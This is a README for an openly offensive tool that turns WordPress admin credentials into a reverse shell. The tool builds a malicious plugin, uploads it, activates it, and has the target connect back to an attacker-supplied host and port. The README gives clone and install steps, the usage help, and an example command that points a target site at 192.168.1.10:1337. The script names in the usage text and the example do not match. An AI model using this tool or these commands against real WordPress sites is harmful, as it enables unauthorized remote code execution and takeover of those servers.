

# Wordpress Reverse Shell Plugin Uploader
### This simple script takes care of making a reverse shell WordPress plugin, uploading it to the website, and activating it to get the reverse shell.
## Installation:

1. Clone the repo
   ```sh
   git clone https://github.com/omaralbalolly/Wordpress-Reverse-Shell-Plugin-Uploader.git
   ```
2. Install the dependencies
   ```sh
   pip3 install requests
   pip3 install bs4
   ```
## Usage:
```shell
usage: wp_pwn.py [-h] -u USERNAME -p PASSWORD -H HOST -P PORT [-k] url

Wordpress Reverse Shell Plugin Uploader

positional arguments:
  url                   Wordpress target url [https://localhost/wp]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        Wordpress Username
  -p PASSWORD, --password PASSWORD
                        Wordpress Password
  -H HOST, --host HOST  Attacker Host
  -P PORT, --port PORT  Attacker Port
  -k                    Disable SSL/TLS Check
```

<!-- USAGE EXAMPLES -->
## Example:
```shell
python3 wp_revshell.py https://localhost/wp -u admin -p password123 -H 192.168.1.10 -P 1337 -k
```
